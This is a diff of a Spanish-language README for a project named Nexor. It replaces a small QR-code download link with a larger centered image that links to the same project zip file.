@@ -9,15 +9,12 @@
 
 <p align="center">𝓓𝓲𝓼𝓮ñ𝓪𝓭𝓸 𝓹𝓪𝓻𝓪 𝓭𝓮𝓼𝓪𝓻𝓻𝓸𝓵𝓵𝓪𝓭𝓸𝓻𝓮𝓼 𝓺𝓾𝓮 𝓫𝓾𝓼𝓬𝓪𝓷 𝓮𝓵𝓮𝓰𝓪𝓷𝓬𝓲𝓪</p>
 
-<table>
-  <tr>
-    <td align="center">Codigo QR:<br>
-      <a href="https://github.com/user-attachments/files/22061570/Nexor.QR.zip">
-        <img src="Nexor-Data/Nexor-imagenes/qr-code.png" width="60" height="60" alt="Descargar">
-      </a>
-    </td>
-  </tr>
-</table>
+<div align="center" style="margin-top:20px;">
+  <p>Descarga el proyecto haciendo click en la imagen:</p>
+  <a href="https://github.com/user-attachments/files/22061570/Nexor.QR.zip">
+    <img src="Nexor-Data/Nexor-imagenes/tu-imagen.png" width="150" alt="Descargar proyecto">
+  </a>
+</div>
 
 ```bash
 # Mi primer programa con nexor
